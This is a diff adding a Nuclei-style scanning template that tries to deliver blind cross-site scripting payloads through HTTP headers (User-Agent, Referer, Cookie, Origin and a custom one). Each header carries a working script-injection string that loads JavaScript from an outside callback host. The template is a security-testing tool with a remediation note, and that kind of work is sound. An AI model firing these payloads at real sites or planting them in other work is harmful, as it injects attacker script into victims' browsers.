@@ -1,0 +1,38 @@
+id: header-blind-xss
+
+info:
+  name: Delivering Blind XSS Payloads via Headers
+  author: panch0r3d
+  severity: varies
+  description: |
+    This template attempts to deliver a Blind Cross-Site Scripting (XSS) payload through various HTTP headers. 
+    It targets endpoints that may improperly handle user-supplied values in headers and subsequently inject scripts.
+  remediation: Ensure that headers are properly sanitized and validated. Implement CSP (Content Security Policy) and other XSS mitigation techniques.
+  classification:
+    cwe-id: CWE-79
+  metadata:
+    max-request: 25
+  tags: xss, security, headers
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    redirects: true
+    max-redirects: 5
+    headers:
+      User-Agent: "Mozilla UACanary12345'&#8211;><script src=https://vijaysutar.bxss.in></script>"
+      Gibberish: "XFFCanary12345.{{Hostname}}'&#8211;><script src=https://vijaysutar.bxss.in></script>"
+      Referer: "RFcanary12345.comRF'&#8211;><script src=https://vijaysutar.bxss.in></script>"
+      Cookie: "CKCanary12345=qwertyCK'&#8211;><script src=https://vijaysutar.bxss.in></script>"
+      Origin: "ORCanary12345.comOR'&#8211;><script src=https://vijaysutar.bxss.in></script>"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<script src=https://vijaysutar.bxss.in></script>"
+        part: body
+    stop-at-first-match: true
